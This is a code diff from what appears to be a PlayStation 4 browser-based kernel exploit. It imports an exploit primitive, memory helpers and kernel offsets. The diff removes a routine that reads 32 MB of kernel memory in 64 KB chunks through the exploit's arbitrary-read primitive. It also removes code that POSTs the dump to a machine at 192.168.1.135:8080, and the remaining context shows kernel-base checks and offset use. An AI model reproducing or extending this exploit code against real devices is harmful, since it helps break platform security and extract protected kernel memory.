@@ -1,5 +1,5 @@
 import { establishPrimitive } from "./core.js?v=10";
-import { installWindowP, pairStatus, readInto } from "./mem.js";
+import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
 import { offsetsFor } from "./ps4_offsets.js";
 
@@ -140,36 +140,6 @@ function check(name, ok, detail) {
     mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
   }
   return ok;
-}
-
-async function dumpKernelMemory(p, kernelBase, totalSize = 0x2000000) 
-{ 
-    const CHUNK_SIZE = 0x10000; // Bloques de 64 KB
-    let dumpBuffer = new Uint8Array(totalSize);
-    
-    let currentAddress = kernelBase;
-    let offset = 0;
-
-    mark("DUMP-KERNEL", "Dumping from base: " + kernelBase.toString());
-
-    while (offset < totalSize) 
-    {
-        try 
-        {
-            readInto(dumpBuffer.subarray(offset, offset + CHUNK_SIZE), currentAddress, CHUNK_SIZE);
-            
-            offset += CHUNK_SIZE;
-            currentAddress = currentAddress.add32(CHUNK_SIZE);
-        } 
-        catch (e) 
-        {
-            mark("DUMP-ERROR", "Fail while reading at " + currentAddress.toString() + ": " + e.message);
-            break;
-        }
-    }
-
-    mark("DUMP-COMPLETE", "Dump completed. Bytes: " + offset);
-    return dumpBuffer.subarray(0, offset);
 }
 
 const SYS = {
@@ -2318,22 +2288,6 @@ let allDone = false,
     if (!kbAligned) {
       allDone = true;
       return;
-    }
-
-    if (kbAligned) {
-        try {
-            let kernelBuffer = await dumpKernelMemory(p, KBASE, 0x2000000);
-            
-            await fetch("http://192.168.1.135:8080/upload_kernel_dump", {
-                method: "POST",
-                headers: { "Content-Type": "application/octet-stream" },
-                body: kernelBuffer
-            });
-            
-            mark("DUMP-SENT", "kernel_dump.bin file sent to PC.");
-        } catch (err) {
-            mark("DUMP-SEND-FAIL", err.message);
-        }
     }
 
     const OID = KBASE.add32(off.k_oid_kern_file);
